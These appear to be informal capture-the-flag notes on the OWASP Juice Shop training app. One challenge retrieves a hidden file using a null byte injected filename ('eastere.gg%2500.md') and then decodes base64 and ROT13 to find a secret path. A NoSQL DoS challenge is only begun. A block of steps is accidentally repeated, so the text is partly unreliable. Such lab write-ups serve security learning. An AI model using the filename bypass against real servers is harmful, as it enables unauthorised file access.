1. Pre-requiste of solving Challenge "Find the hidden Easter egg", from which we downloaded a file: eastere.gg%2500.md with null byte injection attack.
2. The interesting contents are:  

Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA== 
3. The last portion looks like a b64 encoded string, decoding it gives
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
4. This appended to localhost:3000/ will not work;
5. We see recurring paths in the decoding string such as rtt and gur and searching online with rtt and gur encryption hints ROT13 was used.
6. The online ROT13 decoder decoded the path as /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
7. Appending it to  localhost:3000 and we are directed to a page of rotating planet.
8. Challenge Solved. 

Challenge: NoSQL DoS

/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
4. This appended to localhost:3000/ will not work;
5. We see recurring paths in the decoding string such as rtt and gur and searching online with rtt and gur encryption hints ROT13 was used.
6. The online ROT13 decoder decoded the path as /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
7. Appending it to  localhost:3000 and we are directed to a page of rotating planet.
8. Challenge Solved. 

Challenge: NoSQL DoS
1. MarsDB is used in Juice Shop --> Search for DoS for MarsDB
2. There is an existing DoS vulnerability listed on https://snyk.io/test/npm/marsdb-mongo/0.0.7, but it does not explicitly tell us how to do it. 
3. Also, we need to find the endpoint that connects to the DB. Now we know that there are 2 types of DB used in juice shop --> SQL and noSQL. 
	a. There is not much details in burpsuite that points to an explicit marsdb endpoint (eg. no endpt like /rest/marsdb) 
	b. Another way of handling db interfacing on server side is to encapsulate the connection uri in the server side function; making it hidden to clients.
	c. So, the possible pages that will interface marsdb are anything that looks like it pulls data from a DB --> reviews, products,  etc.
